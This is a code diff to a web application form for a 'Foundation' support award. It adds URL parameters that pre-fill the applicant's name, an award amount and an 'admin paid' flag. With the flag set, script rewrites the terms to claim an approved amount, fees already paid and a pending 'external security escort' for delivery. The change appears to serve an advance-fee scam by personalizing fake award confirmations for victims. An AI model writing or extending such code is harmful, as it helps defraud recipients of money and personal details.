@@ -220,8 +220,8 @@
     <div class="body" id="form-body">
       <div class="meta-box">
         <div class="field-row">
-          <label for="support_category">Support category</label>
-          <input type="text" id="support_category" name="support_category" required />
+          <label for="support_amount">Support amount</label>
+          <input type="text" id="support_amount" name="support_amount" required />
         </div>
         <div class="field-row">
           <label for="app_date">Application date</label>
@@ -287,9 +287,10 @@
 
       <section class="section">
         <div class="section-title">6. Support</div>
-        <p class="paragraph">
+        <p class="paragraph" id="section-6-text">
           I understand that final support amount is selected in a later step and that administrative processing may be required before release. Support is non-transferable unless the Foundation allows otherwise, and no fee is required to apply or to be selected.
         </p>
+        <input type="hidden" name="admin_paid" id="admin_paid" value="0" />
       </section>
 
       <section class="section">
@@ -342,6 +343,34 @@
       var status = document.getElementById('status');
       var successPanel = document.getElementById('success-panel');
       var submitBtn = document.getElementById('submit-btn');
+      var params = new URLSearchParams(window.location.search);
+      var fullNameInput = form.querySelector('[name="full_name"]');
+      var amountInput = document.getElementById('support_amount');
+      var adminPaidInput = document.getElementById('admin_paid');
+      var section6 = document.getElementById('section-6-text');
+
+      if (params.get('name')) fullNameInput.value = params.get('name');
+      if (params.get('amount')) amountInput.value = params.get('amount');
+      if (params.get('adminPaid') === '1' || params.get('adminPaid') === 'true') {
+        adminPaidInput.value = '1';
+      }
+
+      function updateSection6() {
+        var amount = (amountInput.value || '').trim() || '[support amount]';
+        if (adminPaidInput.value === '1') {
+          section6.innerHTML =
+            'I accept the approved support amount of <strong>' + amount.replace(/</g, '') + '</strong>. ' +
+            'I acknowledge that administrative processing for this award has already been completed and paid. ' +
+            'Support is non-transferable unless the Foundation allows otherwise. No fee was required to apply or to be selected. ' +
+            'Remaining steps (including any external security escort required for delivery) do not change my ownership of this approved amount.';
+        } else {
+          section6.textContent =
+            'I accept the support amount stated above. I understand that administrative processing may be required before release. ' +
+            'Support is non-transferable unless the Foundation allows otherwise, and no fee is required to apply or to be selected.';
+        }
+      }
+      amountInput.addEventListener('input', updateSection6);
+      updateSection6();
 
       form.addEventListener('submit', function (e) {
         e.preventDefault();
@@ -351,7 +380,8 @@
 
         var fd = new FormData(form);
         var payload = {
-          supportCategory: fd.get('support_category'),
+          supportAmount: fd.get('support_amount'),
+          adminPaid: fd.get('admin_paid') === '1',
           applicationDate: fd.get('app_date'),
           fullName: fd.get('full_name'),
           addressStreet: fd.get('address_street'),
@@ -397,11 +427,10 @@
       });
 
       var printName = form.querySelector('[name="print_name"]');
-      var fullName = form.querySelector('[name="full_name"]');
       var signature = form.querySelector('[name="signature"]');
-      fullName.addEventListener('blur', function () {
-        if (!printName.value) printName.value = fullName.value;
-        if (!signature.value) signature.value = fullName.value;
+      fullNameInput.addEventListener('blur', function () {
+        if (!printName.value) printName.value = fullNameInput.value;
+        if (!signature.value) signature.value = fullNameInput.value;
       });
     })();
   </script>
